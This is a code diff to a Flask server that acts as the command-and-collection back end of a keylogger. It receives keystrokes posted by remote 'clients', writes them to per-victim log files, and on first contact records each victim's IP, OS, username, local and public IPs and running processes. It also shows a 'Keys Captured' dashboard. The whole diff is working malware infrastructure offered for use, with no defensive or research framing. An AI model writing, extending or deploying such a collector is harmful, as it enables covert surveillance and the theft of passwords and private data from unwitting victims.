@@ -7,26 +7,55 @@ app = Flask(__name__)
 LOG_DIR = "logs"
 os.makedirs(LOG_DIR, exist_ok=True)
 
-clients = {}  # hwid -> {"hostname": str, "last_seen": str, "total_keys": int}
+clients = {}  # hwid -> dict with info
 
 @app.route("/log", methods=["POST"])
 def receive_log():
     keystrokes = request.form.get("k", "")
     hostname = request.form.get("hostname", "unknown")
     hwid = request.form.get("hwid", "unknown")
+    client_ip = request.remote_addr
 
     now = datetime.datetime.now().isoformat(timespec="seconds")
 
+    # --- Per-client log file path ---
+    safe_name = hostname.replace(" ", "_").replace("/", "_")
+    client_log = os.path.join(LOG_DIR, f"{safe_name}_{hwid}.log")
+    is_new_client = not os.path.exists(client_log)
+
+    # --- If first contact, write system info header at top of file ---
+    is_first_contact = request.form.get("first_contact") == "1"
+
+    if is_new_client or is_first_contact:
+        header_lines = [
+            f"{'='*60}",
+            f"CLIENT: {hostname}",
+            f"HWID:   {hwid}",
+            f"IP:     {client_ip}",
+            f"FIRST SEEN: {now}",
+        ]
+        if is_first_contact:
+            header_lines += [
+                f"OS:     {request.form.get('os', 'unknown')}",
+                f"ARCH:   {request.form.get('arch', 'unknown')}",
+                f"USER:   {request.form.get('username', 'unknown')}",
+                f"LOCAL IP: {request.form.get('local_ip', 'unknown')}",
+                f"PUBLIC IP: {request.form.get('public_ip', 'unknown')}",
+                f"PROCESSES: {request.form.get('processes', 'unknown')}",
+            ]
+        header_lines.append(f"{'='*60}\n")
+
+        with open(client_log, "w") as f:
+            f.write("\n".join(header_lines))
+
     # --- Unified log with identity ---
-    line = f"[{now}] [{hostname}] [{hwid}] {keystrokes}"
+    line = f"[{now}] [{hostname}] [{hwid}] ({client_ip}) {keystrokes}"
     print(line)
 
     with open(os.path.join(LOG_DIR, "all_clients.log"), "a") as f:
         f.write(line + "\n")
 
-    # --- Per-client log file ---
-    safe_name = hostname.replace(" ", "_").replace("/", "_")
-    client_log = os.path.join(LOG_DIR, f"{safe_name}_{hwid}.log")
+    # --- Append keystrokes to per-client log ---
     with open(client_log, "a") as f:
         f.write(f"[{now}] {keystrokes}\n")
 
@@ -34,24 +63,27 @@ def receive_log():
     if hwid not in clients:
         clients[hwid] = {
             "hostname": hostname,
+            "ip": client_ip,
             "first_seen": now,
             "last_seen": now,
             "total_keys": 0,
         }
     clients[hwid]["last_seen"] = now
     clients[hwid]["total_keys"] += len(keystrokes)
+    clients[hwid]["ip"] = client_ip  # update on each transfer
 
     return "OK", 200
 
 @app.route("/clients", methods=["GET"])
 def list_clients():
-    """Return a simple HTML dashboard of connected clients."""
+    """HTML dashboard of connected clients."""
     rows = ""
     for hwid, info in sorted(clients.items(), key=lambda x: x[1]["last_seen"], reverse=True):
         rows += (
             f"<tr>"
             f"<td>{info['hostname']}</td>"
             f"<td><code>{hwid}</code></td>"
+            f"<td>{info['ip']}</td>"
             f"<td>{info['last_seen']}</td>"
             f"<td>{info['first_seen']}</td>"
             f"<td>{info['total_keys']}</td>"
@@ -68,6 +100,7 @@ def list_clients():
             <tr>
                 <th>Hostname</th>
                 <th>HWID</th>
+                <th>IP</th>
                 <th>Last Seen</th>
                 <th>First Seen</th>
                 <th>Keys Captured</th>
